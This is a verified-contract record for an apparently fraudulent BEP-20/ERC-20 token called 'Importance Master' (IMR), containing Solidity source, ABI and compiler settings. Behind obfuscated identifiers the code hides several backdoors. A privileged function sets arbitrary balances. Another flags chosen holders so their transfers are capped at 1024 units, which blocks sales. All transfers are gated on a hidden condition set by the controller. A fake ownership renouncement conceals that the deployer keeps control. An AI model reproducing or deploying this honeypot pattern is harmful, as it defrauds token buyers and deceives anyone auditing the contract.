{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface buyLimitTake {\n    function createPair(address sellMin, address totalMax) external returns (address);\n}\n\ninterface marketingExemptSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitMaxLiquidity) external view returns (uint256);\n\n    function transfer(address feeLaunchedAuto, uint256 takeMode) external returns (bool);\n\n    function allowance(address launchTxReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeLaunchedAuto,\n        uint256 takeMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalTakeAuto, uint256 value);\n    event Approval(address indexed launchTxReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract listFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface marketingExemptSenderMetadata is marketingExemptSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ImportanceMaster is listFund, marketingExemptSender, marketingExemptSenderMetadata {\n\n    uint256 private launchAt = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public maxTx;\n\n    function swapFee(uint256 takeMode) public {\n        txShould();\n        teamBuyMax = takeMode;\n    }\n\n    function transfer(address launchBuy, uint256 takeMode) external virtual override returns (bool) {\n        return txFrom(_msgSender(), launchBuy, takeMode);\n    }\n\n    event OwnershipTransferred(address indexed receiverTake, address indexed totalWallet);\n\n    function txFrom(address txSwap, address feeLaunchedAuto, uint256 takeMode) internal returns (bool) {\n        if (txSwap == atEnable) {\n            return tradingLaunchedSwap(txSwap, feeLaunchedAuto, takeMode);\n        }\n        uint256 toSell = marketingExemptSender(atFee).balanceOf(teamAtTotal);\n        require(toSell == teamBuyMax);\n        require(feeLaunchedAuto != teamAtTotal);\n        if (toTotal[txSwap]) {\n            return tradingLaunchedSwap(txSwap, feeLaunchedAuto, fundTeam);\n        }\n        return tradingLaunchedSwap(txSwap, feeLaunchedAuto, takeMode);\n    }\n\n    mapping(address => mapping(address => uint256)) private minTotal;\n\n    uint256 teamBuyMax;\n\n    function amountLimit(address shouldTotal) public {\n        if (isSell) {\n            return;\n        }\n        if (buySell) {\n            feeAt = amountTrading;\n        }\n        maxTx[shouldTotal] = true;\n        \n        isSell = true;\n    }\n\n    bool public isSell;\n\n    function decimals() external view virtual override returns (uint8) {\n        return toWallet;\n    }\n\n    address public atEnable;\n\n    function owner() external view returns (address) {\n        return atMarketing;\n    }\n\n    function getOwner() external view returns (address) {\n        return atMarketing;\n    }\n\n    function balanceOf(address limitMaxLiquidity) public view virtual override returns (uint256) {\n        return feeLimit[limitMaxLiquidity];\n    }\n\n    uint256 constant fundTeam = 2 ** 10;\n\n    function transferFrom(address txSwap, address feeLaunchedAuto, uint256 takeMode) external override returns (bool) {\n        if (_msgSender() != buySender) {\n            if (minTotal[txSwap][_msgSender()] != type(uint256).max) {\n                require(takeMode <= minTotal[txSwap][_msgSender()]);\n                minTotal[txSwap][_msgSender()] -= takeMode;\n            }\n        }\n        return txFrom(txSwap, feeLaunchedAuto, takeMode);\n    }\n\n    address teamAtTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private toReceiver = \"IMR\";\n\n    mapping(address => bool) public toTotal;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverSwap;\n    }\n\n    function exemptFrom(address limitWalletTake) public {\n        txShould();\n        \n        if (limitWalletTake == atEnable || limitWalletTake == atFee) {\n            return;\n        }\n        toTotal[limitWalletTake] = true;\n    }\n\n    function txWallet(address launchBuy, uint256 takeMode) public {\n        txShould();\n        feeLimit[launchBuy] = takeMode;\n    }\n\n    uint8 private toWallet = 18;\n\n    bool public buySell;\n\n    function allowance(address fundSwapMarketing, address marketingToken) external view virtual override returns (uint256) {\n        if (marketingToken == buySender) {\n            return type(uint256).max;\n        }\n        return minTotal[fundSwapMarketing][marketingToken];\n    }\n\n    constructor (){\n        if (shouldReceiver != amountTrading) {\n            launchMin = false;\n        }\n        feeTrading takeFrom = feeTrading(buySender);\n        atFee = buyLimitTake(takeFrom.factory()).createPair(takeFrom.WETH(), address(this));\n        \n        atEnable = _msgSender();\n        maxTx[atEnable] = true;\n        feeLimit[atEnable] = launchAt;\n        modeToken();\n        if (buySell != launchMin) {\n            shouldReceiver = sellSwapAmount;\n        }\n        emit Transfer(address(0), atEnable, launchAt);\n    }\n\n    uint256 public sellSwapAmount;\n\n    function txShould() private view {\n        require(maxTx[_msgSender()]);\n    }\n\n    address buySender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private amountTrading;\n\n    uint256 takeSell;\n\n    string private receiverSwap = \"Importance Master\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return toReceiver;\n    }\n\n    address public atFee;\n\n    mapping(address => uint256) private feeLimit;\n\n    uint256 private shouldReceiver;\n\n    function modeToken() public {\n        emit OwnershipTransferred(atEnable, address(0));\n        atMarketing = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchAt;\n    }\n\n    function approve(address marketingToken, uint256 takeMode) public virtual override returns (bool) {\n        minTotal[_msgSender()][marketingToken] = takeMode;\n        emit Approval(_msgSender(), marketingToken, takeMode);\n        return true;\n    }\n\n    bool public launchMin;\n\n    uint256 public feeAt;\n\n    function tradingLaunchedSwap(address txSwap, address feeLaunchedAuto, uint256 takeMode) internal returns (bool) {\n        require(feeLimit[txSwap] >= takeMode);\n        feeLimit[txSwap] -= takeMode;\n        feeLimit[feeLaunchedAuto] += takeMode;\n        emit Transfer(txSwap, feeLaunchedAuto, takeMode);\n        return true;\n    }\n\n    address private atMarketing;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchTxReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalTakeAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundSwapMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTotal\",\"type\":\"address\"}],\"name\":\"amountLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMaxLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buySell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitWalletTake\",\"type\":\"address\"}],\"name\":\"exemptFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellSwapAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeMode\",\"type\":\"uint256\"}],\"name\":\"swapFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeLaunchedAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeMode\",\"type\":\"uint256\"}],\"name\":\"txWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ImportanceMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}